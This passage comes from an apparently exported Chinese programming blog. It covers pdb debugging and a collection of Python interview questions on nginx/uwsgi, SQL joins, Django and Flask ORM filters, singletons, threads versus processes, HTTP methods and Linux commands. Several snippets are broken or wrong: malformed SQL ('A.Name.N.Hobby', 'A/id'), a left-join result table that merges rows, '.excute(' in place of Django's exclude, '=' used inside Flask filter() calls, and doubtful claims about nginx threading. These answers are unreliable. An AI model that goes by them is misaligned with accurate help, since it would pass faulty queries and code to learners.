class="number">1</span>, n + <span class="number">1</span>):</span><br><span class="line">        number_sum += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    pointless_loop(<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="n-next-和s-step-的区别"><a href="#n-next-和s-step-的区别" class="headerlink" title="n(next)和s(step)的区别"></a>n(next)和s(step)的区别</h4><p><img src="http://p5m1dtoh7.bkt.clouddn.com/python3%E8%B0%83%E8%AF%95--logging%E4%B8%8Epdb/%E7%A4%BA%E4%BE%8B2-1.jpg" alt=""><br><img src="http://p5m1dtoh7.bkt.clouddn.com/python3%E8%B0%83%E8%AF%95--logging%E4%B8%8Epdb/%E7%A4%BA%E4%BE%8B2-2.jpg" alt=""><br>可以看出n表示执行下一行代码，但是不会进入函数，而s会执行并进入函数</p><h4 id="为断点设置条件"><a href="#为断点设置条件" class="headerlink" title="为断点设置条件"></a>为断点设置条件</h4><p>如下图是我设置的断点条件<br><img src="http://p5m1dtoh7.bkt.clouddn.com/python3%E8%B0%83%E8%AF%95--logging%E4%B8%8Epdb/%E7%A4%BA%E4%BE%8B2-3.jpg" alt=""></p><h4 id="为断点设置暂时条件（就是说断点在使用一次之后就会被删除）"><a href="#为断点设置暂时条件（就是说断点在使用一次之后就会被删除）" class="headerlink" title="为断点设置暂时条件（就是说断点在使用一次之后就会被删除）"></a>为断点设置暂时条件（就是说断点在使用一次之后就会被删除）</h4><p>如下图:<br><img src="http://p5m1dtoh7.bkt.clouddn.com/python3%E8%B0%83%E8%AF%95--logging%E4%B8%8Epdb/%E7%A4%BA%E4%BE%8B2-5.jpg" alt=""></p><h4 id="禁用断点"><a href="#禁用断点" class="headerlink" title="禁用断点"></a>禁用断点</h4><p>如下图:<br><img src="http://p5m1dtoh7.bkt.clouddn.com/python3%E8%B0%83%E8%AF%95--logging%E4%B8%8Epdb/%E7%A4%BA%E4%BE%8B2-4.jpg" alt=""></p><h4 id="使用display显示旧值与当前值"><a href="#使用display显示旧值与当前值" class="headerlink" title="使用display显示旧值与当前值"></a>使用display显示旧值与当前值</h4><p>如下图：<br><img src="http://p5m1dtoh7.bkt.clouddn.com/python3%E8%B0%83%E8%AF%95--logging%E4%B8%8Epdb/%E7%A4%BA%E4%BE%8B2-6.jpg" alt=""></p><h4 id="从这个示例中学到什么"><a href="#从这个示例中学到什么" class="headerlink" title="从这个示例中学到什么?"></a>从这个示例中学到什么?</h4><ul><li>next和step可以一步一步执行代码（注意next与step的区别）</li><li>断点可以有条件</li><li>可以禁用断点</li><li>使用display显示当前值与旧值</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><em><a href="https://www.youtube.com/watch?v=BixeKmlKOJc" target="_blank" rel="noopener">一个很好的讲解pdb调试视频</a></em></li></ul>]]></content>
      
      <categories>
          
          <category> debug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> debug </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>python面试题收集</title>
      <link href="/python%E9%9D%A2%E8%AF%95%E9%A2%98%E6%94%B6%E9%9B%86.html"/>
      <content type="html"><![CDATA[<blockquote class="blockquote-center">学习别人的，渐渐成为自己的</blockquote><blockquote><p>搜集一些别人的面试题,为自己的面试做些准备。以后逐渐添加面试题</p></blockquote><a id="more"></a><h3 id="nginx与uwsgi是如何通信的？"><a href="#nginx与uwsgi是如何通信的？" class="headerlink" title="nginx与uwsgi是如何通信的？"></a>nginx与uwsgi是如何通信的？</h3><p>我们知道，nginx把浏览器等发过来的请求通过proxy_pass或者uwsgi_pass转发给上游的web application进行处理，然后把处理的结果发送给浏览器。uwsgi_pass命令的处理函数为ngx_http_uwsgi_handler,也就是说，当有请求到达配置uwsgi_pass的location时，会调用ngx_http_uwsgi_handler方法，而该方法是整个uwsgi事件处理的入口方法。下面来看该方法：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">static</span> ngx_int_t ngx_http_uwsgi_handler(ngx_http_request_t *r) &#123; </span><br><span class="line"><span class="attribute">ngx_http_upstream_t</span> *u;</span><br><span class="line"><span class="attribute">ngx_http_uwsgi_loc_conf_t</span> *uwcf;</span><br><span class="line"><span class="attribute">uwcf</span> = ngx_http_get_module_loc_conf(r, ngx_http_uwsgi_module);</span><br><span class="line"><span class="attribute">u</span> = r-&gt;upstream;</span><br><span class="line">……</span><br><span class="line">u-&gt;create_request = ngx_http_uwsgi_create_request;//根据wsgi协议创建请求包体</span><br><span class="line">u-&gt;process_header = ngx_http_uwsgi_process_status_line;//根据wsgi协议解析uwsgi发送来的头部</span><br><span class="line">……</span><br><span class="line">rc = ngx_http_read_client_request_body(r, ngx_http_upstream_init);//从浏览器读取body数据</span><br><span class="line">…… </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="nginx与uwsgi是多线程还是多进程"><a href="#nginx与uwsgi是多线程还是多进程" class="headerlink" title="nginx与uwsgi是多线程还是多进程 ?"></a>nginx与uwsgi是多线程还是多进程 ?</h3><ul><li>uwsgi是用c语言写的一个webserver，可以启动多个进程，进程里面可以启动多个线程来服务。进程分为主进程和worker进程，worker里面可以有多个线程。</li><li>Nginx会按需同时运行多个进程：一个主进程(master)和几个工作进程(worker)，配置了缓存时还会有缓存加载器进程(cache loader)和缓存管理器进程(cache manager)等。Nginx主要通过“共享内存”的机制实现进程间通信。主进程以root用户身份运行，而worker、cache loader和cache manager均应以非特权用户身份运行。</li><li>在工作方式上，Nginx分为单工作进程和多工作进程两种模式。在单工作进程模式下，除主进程外，还有一个工作进程，工作进程是单线程的；在多工作进程模式下，每个工作进程包含多个线程。Nginx默认为单工作进程模式。</li></ul><h3 id="连表查询"><a href="#连表查询" class="headerlink" title="连表查询"></a>连表查询</h3><p>假设有如下两张表：</p><p>表A</p><table><thead><tr><th style="text-align:center">ID</th><th style="text-align:center">Name</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">Tiim</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">Jimmy</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">John</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">Tom</td></tr></tbody></table><p>表B</p><table><thead><tr><th style="text-align:center">ID</th><th style="text-align:center">Hobby</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">Football</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">Basketball</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">Tennis</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">Soccer</td></tr></tbody></table><h4 id="内联结"><a href="#内联结" class="headerlink" title="内联结"></a>内联结</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> A.Name B.Hobby <span class="keyword">from</span> A, B <span class="keyword">where</span> A.id = B.id</span><br></pre></td></tr></table></figure><p>这是隐式的内联结，查询的结果是：</p><table><thead><tr><th style="text-align:center">Name</th><th style="text-align:center">Hobby</th></tr></thead><tbody><tr><td style="text-align:center">Tiim</td><td style="text-align:center">Football</td></tr><tr><td style="text-align:center">Jimmy</td><td style="text-align:center">Basketball</td></tr><tr><td style="text-align:center">Jimmy</td><td style="text-align:center">Tennis</td></tr><tr><td style="text-align:center">Tom</td><td style="text-align:center">Soccer</td></tr></tbody></table><p>它的作用和：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> A.Name,B.Hobby <span class="keyword">from</span> A <span class="keyword">INNER</span> <span class="keyword">join</span> B <span class="keyword">on</span> A.id = B.id</span><br></pre></td></tr></table></figure></p><h4 id="外左联结"><a href="#外左联结" class="headerlink" title="外左联结"></a>外左联结</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> A.Name,B.Hobby <span class="keyword">from</span> A <span class="keyword">left</span> <span class="keyword">join</span> B <span class="keyword">on</span> A.id = B.id</span><br></pre></td></tr></table></figure><p>这样查询得到的结果将会是保留所有A表中联结字段的记录，若无与其相对应的B表中的字段记录则留空，结果如下：</p><table><thead><tr><th style="text-align:center">Name</th><th style="text-align:center">Hobby</th></tr></thead><tbody><tr><td style="text-align:center">Tiim</td><td style="text-align:center">Football</td></tr><tr><td style="text-align:center">Jimmy</td><td style="text-align:center">Basketball,Tennis</td></tr><tr><td style="text-align:center">Jhon</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">Tom</td><td style="text-align:center">Soccer</td></tr></tbody></table><p>所以从上面结果看出，因为A表中的John记录的ID没有在B表中有对应ID，因此为空，但Name栏仍有John记录。</p><h4 id="右外联结"><a href="#右外联结" class="headerlink" title="右外联结"></a>右外联结</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> A.Name.N.Hobby <span class="keyword">from</span> A <span class="keyword">right</span> <span class="keyword">join</span> B <span class="keyword">on</span> A/<span class="keyword">id</span> = B.id</span><br></pre></td></tr></table></figure><p>结果将会是：</p><table><thead><tr><th style="text-align:center">Name</th><th style="text-align:center">Hobby</th></tr></thead><tbody><tr><td style="text-align:center">Tiim</td><td style="text-align:center">Football</td></tr><tr><td style="text-align:center">Jimmy</td><td style="text-align:center">Basketball</td></tr><tr><td style="text-align:center">Jimmy</td><td style="text-align:center">Tennis</td></tr><tr><td style="text-align:center">Tom</td><td style="text-align:center">Soccer</td></tr></tbody></table><h3 id="ORM中的连表查询"><a href="#ORM中的连表查询" class="headerlink" title="ORM中的连表查询"></a>ORM中的连表查询</h3><h4 id="Django中"><a href="#Django中" class="headerlink" title="Django中"></a>Django中</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Entry.objects.filter(blog__name=<span class="string">'Beatles Blog'</span>)</span><br></pre></td></tr></table></figure><h4 id="Flask中"><a href="#Flask中" class="headerlink" title="Flask中"></a>Flask中</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Entry.query.join(Blog,Blog.id == Entry.blog_id).filter(Blog.name = <span class="string">'Beatles Blog'</span>)</span><br></pre></td></tr></table></figure><h3 id="写一个单例模式"><a href="#写一个单例模式" class="headerlink" title="写一个单例模式"></a>写一个单例模式</h3><ul><li><p>使用继承方式:</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span>:</span></span><br><span class="line">    _instance = <span class="keyword">None</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__new__</span><span class="params">(cls, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> cls._instance <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            cls._instance = super(Singleton, cls).__new__(cls, *args, **kwargs)</span><br><span class="line">        <span class="keyword">return</span> cls._instance</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SingleSpam</span><span class="params">(Singleton)</span>:</span></span><br><span class="line">    TEST = <span class="string">'testing'</span></span><br><span class="line">s1 = SingleSpam()</span><br><span class="line">print(s1.TEST, <span class="string">'   '</span>, id(s1))</span><br><span class="line">s2 = SingleSpam()</span><br><span class="line">print(s2.TEST, <span class="string">'   '</span>, id(s2))</span><br></pre></td></tr></table></figure></li><li><p>使用装饰器</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">singleton</span><span class="params">(cls)</span>:</span></span><br><span class="line">    instances = &#123;&#125;</span><br><span class="line"><span class="meta">    @wraps(cls)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_instance</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> cls <span class="keyword">not</span> <span class="keyword">in</span> instances:</span><br><span class="line">            instances[cls] = cls(*args, **kwargs)</span><br><span class="line">        <span class="keyword">return</span> instances[cls]</span><br><span class="line">    <span class="keyword">return</span> _instance</span><br><span class="line"><span class="meta">@singleton</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SingleSpam</span><span class="params">(object)</span>:</span></span><br><span class="line">    TEST = <span class="string">'testing'</span></span><br><span class="line">s1 = SingleSpam()</span><br><span class="line">print(s1.TEST, <span class="string">'   '</span>, id(s1))</span><br><span class="line">s2 = SingleSpam()</span><br><span class="line">print(s2.TEST, <span class="string">'   '</span>, id(s2))</span><br></pre></td></tr></table></figure></li><li><p>使用元类</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span><span class="params">(type)</span>:</span></span><br><span class="line">    _instance = <span class="keyword">None</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(cls, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> cls._instance <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            cls._instance = super(Singleton, cls).__call__(*args, **kwargs)</span><br><span class="line">        <span class="keyword">return</span> cls._instance</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SingleSpam</span><span class="params">(metaclass=Singleton)</span>:</span></span><br><span class="line">    TEST = <span class="string">'testing'</span></span><br><span class="line">s1 = SingleSpam()</span><br><span class="line">print(s1.TEST, <span class="string">'   '</span>, id(s1))</span><br><span class="line">s2 = SingleSpam()</span><br><span class="line">print(s2.TEST, <span class="string">'   '</span>, id(s2))</span><br></pre></td></tr></table></figure></li></ul><h3 id="请你说出几种常见的反爬策略"><a href="#请你说出几种常见的反爬策略" class="headerlink" title="请你说出几种常见的反爬策略?"></a>请你说出几种常见的反爬策略?</h3><ul><li>检查user-agent</li><li>加防盗链</li><li>使用验证码</li><li>监控ip</li><li>监控session</li><li>将请求的参数加密</li></ul><h3 id="请说一下线程与进程的区别"><a href="#请说一下线程与进程的区别" class="headerlink" title="请说一下线程与进程的区别"></a>请说一下线程与进程的区别</h3><p>进程和线程的主要差别在于它们是不同的操作系统资源管理方式。进程有独立的地址空间，一个进程崩溃后，在保护模式下不会对其它进程产生影响，而线程只是一个进程中的不同执行路径。线程有自己的堆栈和局部变量，但线程之间没有单独的地址空间，一个线程死掉就等于整个进程死掉，所以多进程的程序要比多线程的程序健壮，但在进程切换时，耗费资源较大，效率要差一些。<strong>但对于一些要求同时进行并且又要共享某些变量的并发操作，只能用线程，不能用进程。</strong></p><p><strong>1) 简而言之,一个程序至少有一个进程,一个进程至少有一个线程.</strong></p><h4 id="线程的划分尺度小于进程，使得多线程程序的并发性高。"><a href="#线程的划分尺度小于进程，使得多线程程序的并发性高。" class="headerlink" title="线程的划分尺度小于进程，使得多线程程序的并发性高。"></a>线程的划分尺度小于进程，使得多线程程序的并发性高。</h4><h4 id="另外，进程在执行过程中拥有独立的内存单元，而多个线程共享内存，从而极大地提高了程序的运行效率。"><a href="#另外，进程在执行过程中拥有独立的内存单元，而多个线程共享内存，从而极大地提高了程序的运行效率。" class="headerlink" title="另外，进程在执行过程中拥有独立的内存单元，而多个线程共享内存，从而极大地提高了程序的运行效率。"></a>另外，进程在执行过程中拥有独立的内存单元，而多个线程共享内存，从而极大地提高了程序的运行效率。</h4><h4 id="线程在执行过程中与进程还是有区别的。每个独立的线程有一个程序运行的入口、顺序执行序列和程序的出口。但是线程不能够独立执行，必须依存在应用程序中，由应用程序提供多个线程执行控制。"><a href="#线程在执行过程中与进程还是有区别的。每个独立的线程有一个程序运行的入口、顺序执行序列和程序的出口。但是线程不能够独立执行，必须依存在应用程序中，由应用程序提供多个线程执行控制。" class="headerlink" title="线程在执行过程中与进程还是有区别的。每个独立的线程有一个程序运行的入口、顺序执行序列和程序的出口。但是线程不能够独立执行，必须依存在应用程序中，由应用程序提供多个线程执行控制。"></a>线程在执行过程中与进程还是有区别的。每个独立的线程有一个程序运行的入口、顺序执行序列和程序的出口。<strong>但是线程不能够独立执行，</strong>必须依存在应用程序中，由应用程序提供多个线程执行控制。</h4><h4 id="从逻辑角度来看，多线程的意义在于一个应用程序中，有多个执行部分可以同时执行。但操作系统并没有将多个线程看做多个独立的应用，来实现进程的调度和管理以及资源分配。这就是进程和线程的重要区别。"><a href="#从逻辑角度来看，多线程的意义在于一个应用程序中，有多个执行部分可以同时执行。但操作系统并没有将多个线程看做多个独立的应用，来实现进程的调度和管理以及资源分配。这就是进程和线程的重要区别。" class="headerlink" title="从逻辑角度来看，多线程的意义在于一个应用程序中，有多个执行部分可以同时执行。但操作系统并没有将多个线程看做多个独立的应用，来实现进程的调度和管理以及资源分配。这就是进程和线程的重要区别。"></a>从逻辑角度来看，多线程的意义在于一个应用程序中，有多个执行部分可以同时执行。但操作系统并没有将多个线程看做多个独立的应用，来实现进程的调度和管理以及资源分配。<strong>这就是进程和线程的重要区别。</strong></h4><h3 id="下面的程序-会是什么情况？答案会报参数错误。"><a href="#下面的程序-会是什么情况？答案会报参数错误。" class="headerlink" title="下面的程序 会是什么情况？答案会报参数错误。"></a>下面的程序 会是什么情况？答案会报参数错误。</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self,a)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span><span class="params">(A)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self,a,b)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line">B().run(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>因为B重写了run方法，所以run应该有两个参数</p><h3 id="ORM常用筛选条件"><a href="#ORM常用筛选条件" class="headerlink" title="ORM常用筛选条件"></a>ORM常用筛选条件</h3><h4 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h4><h5 id="大于、大于等于"><a href="#大于、大于等于" class="headerlink" title="大于、大于等于"></a>大于、大于等于</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__gt  大于</span><br><span class="line">__gte  大于等于</span><br><span class="line"></span><br><span class="line">User.objects.filter(age__gt=<span class="number">10</span>)    // 查询年龄大于<span class="number">10</span>岁的用户</span><br><span class="line">User.objects.filter(age__gte=<span class="number">10</span>)  // 查询年龄大于等于<span class="number">10</span>岁的用户</span><br></pre></td></tr></table></figure><h5 id="小于、小于等于"><a href="#小于、小于等于" class="headerlink" title="小于、小于等于"></a>小于、小于等于</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__lt  小于</span><br><span class="line">__lte 小于等于</span><br><span class="line"></span><br><span class="line">User.objects.filter(age__lt=<span class="number">10</span>)     // 查询年龄小于<span class="number">10</span>岁的用户</span><br><span class="line">User.objects.filter(age__lte=<span class="number">10</span>)   // 查询年龄小于等于<span class="number">10</span>岁的用户</span><br></pre></td></tr></table></figure><h5 id="in"><a href="#in" class="headerlink" title="in"></a>in</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__in</span><br><span class="line">查询年龄在某一范围的用户</span><br><span class="line">User.objects.filter(age__in=[<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>])</span><br></pre></td></tr></table></figure><h5 id="like"><a href="#like" class="headerlink" title="like"></a>like</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__exact        精确等于 like <span class="string">'aaa'</span></span><br><span class="line">__iexact       精确等于 忽略大小写 ilike <span class="string">'aaa'</span></span><br><span class="line">__contains     包含 like <span class="string">'%aaa%'</span></span><br><span class="line">__icontains    包含 忽略大小写 ilike <span class="string">'%aaa%'</span>，但是对于sqlite来说，contains的作用效果等同于icontains。</span><br></pre></td></tr></table></figure><h5 id="is-null-is-not-null"><a href="#is-null-is-not-null" class="headerlink" title="is null / is not null"></a>is null / is not null</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__isnull  判空</span><br><span class="line"></span><br><span class="line">User.objects.filter(username__isnull=<span class="keyword">True</span>)    // 查询用户名为空的用户</span><br><span class="line">User.objects.filter(username__isnull=<span class="keyword">False</span>)  // 查询用户名不为空的用户</span><br></pre></td></tr></table></figure><h5 id="不等于-不包含于"><a href="#不等于-不包含于" class="headerlink" title="不等于/不包含于"></a>不等于/不包含于</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User.objects.filter().excute(age=<span class="number">10</span>)    // 查询年龄不为<span class="number">10</span>的用户</span><br><span class="line">User.objects.filter().excute(age__in=[<span class="number">10</span>, <span class="number">20</span>])  // 查询年龄不为在 [<span class="number">10</span>, <span class="number">20</span>] 的用户</span><br></pre></td></tr></table></figure><h4 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h4><h5 id="大于、大于等于-1"><a href="#大于、大于等于-1" class="headerlink" title="大于、大于等于"></a>大于、大于等于</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">User.query.filter(User.age &gt; <span class="number">10</span>)    // 查询年龄大于<span class="number">10</span>岁的用户</span><br><span class="line">User.query.filter(User.age &gt;= <span class="number">10</span>)  // 查询年龄大于等于<span class="number">10</span>岁的用户</span><br></pre></td></tr></table></figure><h5 id="小于、小于等于-1"><a href="#小于、小于等于-1" class="headerlink" title="小于、小于等于"></a>小于、小于等于</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">User.query.filter(User.age &lt; <span class="number">10</span>)     // 查询年龄小于<span class="number">10</span>岁的用户</span><br><span class="line">User.query.filter(User.age &lt;= <span class="number">10</span>)   // 查询年龄小于等于<span class="number">10</span>岁的用户</span><br></pre></td></tr></table></figure><h5 id="in-1"><a href="#in-1" class="headerlink" title="in"></a>in</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询年龄在某一范围的用户</span><br><span class="line">User.query.filter(User.age.in_([<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>]))</span><br></pre></td></tr></table></figure><h5 id="like-1"><a href="#like-1" class="headerlink" title="like"></a>like</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User.query.filter(User.name.like(<span class="string">'%wu%'</span>))</span><br></pre></td></tr></table></figure><h5 id="is-null-is-not-null-1"><a href="#is-null-is-not-null-1" class="headerlink" title="is null / is not null"></a>is null / is not null</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">User.query.filter(User.username = <span class="keyword">None</span> )    // 查询用户名为空的用户</span><br><span class="line">User.query.filter(User.username != <span class="keyword">None</span> )  // 查询用户名不为空的用户</span><br></pre></td></tr></table></figure><h5 id="不等于-不包含于-1"><a href="#不等于-不包含于-1" class="headerlink" title="不等于/不包含于"></a>不等于/不包含于</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User.query.filter(~(User.age=<span class="number">10</span>))    // 查询年龄不为<span class="number">10</span>的用户</span><br><span class="line">User.objects.filter(~(User.age.in_([<span class="number">10</span>,<span class="number">20</span>])))  // 查询年龄不为在 [<span class="number">10</span>, <span class="number">20</span>] 的用户</span><br></pre></td></tr></table></figure><h3 id="put与post的区别"><a href="#put与post的区别" class="headerlink" title="put与post的区别?"></a>put与post的区别?</h3><p>POST<br>用于提交请求，可以更新或者创建资源，是非幂等的<br>举个例子，在我们的支付系统中，一个api的功能是创建收款金额二维码，它和金额相关，每个用户可以有多个二维码，如果连续调用则会创建新的二维码，这个时候就用POST</p><hr><p>PUT<br>用于向指定的URI传送更新资源，是幂等的<br>还是那个例子，用户的账户二维码只和用户关联，而且是一一对应的关系，此时这个api就可以用PUT，因为每次调用它，都将刷新用户账户二维码</p><h3 id="http有几种方式"><a href="#http有几种方式" class="headerlink" title="http有几种方式?"></a>http有几种方式?</h3><p>OPTIONS：返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向Web服务器发送的请求来测试服务器的功能性。</p><p>HEAD：向服务器索要与GET请求相一致的响应，只不过响应体将不会被返回。这一方法可以在不必传输整个响应内容的情况下，就可以获取包含在响应消息头中的元信息。</p><p>GET：向特定的资源发出请求。</p><p>POST：向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的创建和/或已有资源的修改。</p><p>PUT：向指定资源位置上传其最新内容。</p><p>DELETE：请求服务器删除Request-URI所标识的资源。</p><p>TRACE：回显服务器收到的请求，主要用于测试或诊断。</p><p>CONNECT：HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。</p><h3 id="解释下面linux命令的含义"><a href="#解释下面linux命令的含义" class="headerlink" title="解释下面linux命令的含义"></a>解释下面linux命令的含义</h3><p><em>cat:</em> 常用来显示文件内容，或者将几个文件连接起来显示，或者从标准输入读取内容并显示，它常与重定向符号配合使用。<br><em>rsync:</em> 更快更好地远程拷贝文件<br><em>rm:</em> 删除文件或目录<br><em>grep:</em> 在一个或多个文件中搜索字符串模板<br><em>tcpdump:</em> 是一个运行在命令行下的抓包工具<br><em>strace:</em> 常用来跟踪进程执行时的系统调用和所接收的信号<br><em>chmod:</em> 修改文件权限<br><em>less:</em> 对文件或其它输出进行分页显示的工具，可向前向后翻页，而more只能向后翻页<br><em>netstat:</em> 用于列出系统上所有的网络套接字连接情况，包括 tcp, udp 以及 unix 套接字，另外它还能列出处于监听状态（即等待接入请求）的套接字<br><em>top:</em> 实时显示系统中各个进程的资源占用状况<br><em>telnet:</em> 远程登录<br><em>scp:</em> linux系统下基于ssh登陆进行安全的远程文件拷贝命令</p><h3 id="用最简洁的代码，将元素类型为int的list中大于100的元素输出到另一个list-并将后一个list中的元素从大到小排序"><a href="#用最简洁的代码，将元素类型为int的list中大于100的元素输出到另一个list-并将后一个list中的元素从大到小排序" class="headerlink" title="用最简洁的代码，将元素类型为int的list中大于100的元素输出到另一个list,并将后一个list中的元素从大到小排序"></a>用最简洁的代码，将元素类型为int的list中大于100的元素输出到另一个list,并将后一个list中的元素从大到小排序</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">lstA = random.sample(range(<span class="number">1000</span>), <span class="number">100</span>)</span><br><span class="line">lstB = list(filter(<span class="keyword">lambda</span> x: x &gt; <span class="number">100</span>, lstA))</span><br><span class="line">lstB.sort(reverse=<span 